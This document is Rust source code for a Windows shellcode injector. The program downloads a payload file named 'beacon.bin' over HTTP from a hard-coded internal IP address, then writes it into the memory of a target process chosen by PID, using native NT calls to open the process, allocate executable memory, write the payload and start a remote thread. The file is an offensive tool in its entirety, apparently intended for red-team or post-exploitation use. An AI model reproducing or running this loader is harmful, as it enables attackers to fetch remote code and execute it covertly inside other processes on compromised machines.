use sysinfo::*;
use reqwest::*;
use std::{
    default::Default,
    ffi::c_void,
    ptr::null_mut,
    env
};

use bytes::Bytes;

use ntapi::{
    ntpsapi::{NtOpenProcess, NtCreateThreadEx},
    ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory},
    ntapi_base::CLIENT_ID
};

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MAXIMUM_ALLOWED},
        lmaccess::ACCESS_ALL
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};

#[tokio::main]
async fn main() {

    let args: Vec<String> = env::args().collect();
    let pid = &args[1];
    let pid: usize = pid.parse().unwrap();
    let process_id = sysinfo::Pid::from(pid);

    println!("process ID: {}", process_id.as_u32());

    let shellcode = download_shellcode();
    
    let shellcode = shellcode.await.unwrap();

    
   let _res = inject_shellcode(process_id, shellcode.to_vec());
}

async fn download_shellcode() -> Result<Bytes> {
    let body = reqwest::get("http://10.10.10.14/beacon.bin")
    .await?
    .bytes()
    .await?;
    
    return Ok(body);
    
}


fn inject_shellcode(process_id: Pid, mut buf: Vec<u8>) -> std::io::Result<()>{

    unsafe {
        let mut oa = OBJECT_ATTRIBUTES::default();

        let mut process_handle = process_id.as_u32() as HANDLE;

        let mut ci = CLIENT_ID {
            UniqueProcess: process_handle,
            UniqueThread: null_mut(),
        };


        let mut status = NtOpenProcess(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);

        if !NT_SUCCESS(status) {
            panic!("Error opening process: {}", status);
        }

     //   let mut buf = buf.to_vec();
        
        let mut shellcode_length = buf.len();

       // let handle = process_handle;
        let mut base_address : *mut c_void = null_mut();
        status = NtAllocateVirtualMemory(process_handle, &mut base_address, 0, &mut shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


        if !NT_SUCCESS(status) {
            panic!("Error allocating  memory to the target process: {}", status);
        }

        let mut bytes_written = 0;

        let buffer = buf.as_mut_ptr() as *mut c_void;
        let buffer_length = buf.len();

        status = NtWriteVirtualMemory(process_handle, base_address, buffer, buffer_length, &mut bytes_written);

        if !NT_SUCCESS(status) {
            panic!("Error writing shellcode to memory of the target process: {}", status);
        }

        let mut thread_handle : *mut c_void = null_mut();

        status = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), process_handle, base_address, null_mut(), 0, 0, 0, 0, null_mut());

        if !NT_SUCCESS(status) {
            panic!("Error failed to create remote thread: {}", status);
        }
    }   

    Ok(())
}